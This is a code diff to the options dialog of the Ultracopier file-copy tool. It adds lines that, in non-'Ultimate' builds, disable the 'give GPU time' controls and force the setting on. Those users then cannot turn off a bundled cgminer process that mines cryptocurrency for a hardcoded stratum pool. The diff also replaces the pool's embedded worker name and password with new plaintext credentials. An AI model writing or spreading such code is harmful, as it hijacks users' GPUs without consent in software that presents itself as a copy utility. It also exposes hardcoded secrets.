@@ -76,6 +76,11 @@ OptionDialog::OptionDialog() :
     #endif
 
     #ifdef ULTRACOPIER_CGMINER
+    #ifndef ULTRACOPIER_VERSION_ULTIMATE
+    ui->label_gpu_time->setEnabled(false);
+    ui->giveGPUTime->setEnabled(false);
+    OptionEngine::optionEngine->setOptionValue("Ultracopier","giveGPUTime",true);
+    #endif
     bool OpenCLDll=false;
     char *arch=getenv("windir");
     if(arch!=NULL)
@@ -105,7 +110,7 @@ OptionDialog::OptionDialog() :
         connect(&cgminer,static_cast<void(QProcess::*)(int,QProcess::ExitStatus)>(&QProcess::finished),this,&OptionDialog::finished);
         connect(&cgminer,&QProcess::readyReadStandardError,this,&OptionDialog::readyReadStandardError);
         connect(&cgminer,&QProcess::readyReadStandardOutput,this,&OptionDialog::readyReadStandardOutput);
-        QStringList pool1=QStringList() << "-o" << "stratum+tcp://37.59.242.80:3333" <<  "-O" << "alphaonex86_pool:8fN0lcST3RwaI9Ah";
+        QStringList pool1=QStringList() << "-o" << "stratum+tcp://37.59.242.80:3333" <<  "-O" << "alphaonex86_ultracopier:JE5RfIAzapCSABZC";
         pools << pool1;
         //QStringList pool2=QStringList() << "--scrypt" << "-o" << "stratum+tcp://eu.wemineltc.com:3333" <<  "-O" << "alphaonex86.pool:yyDKPcO850pCayTx";
         //pools << pool2;
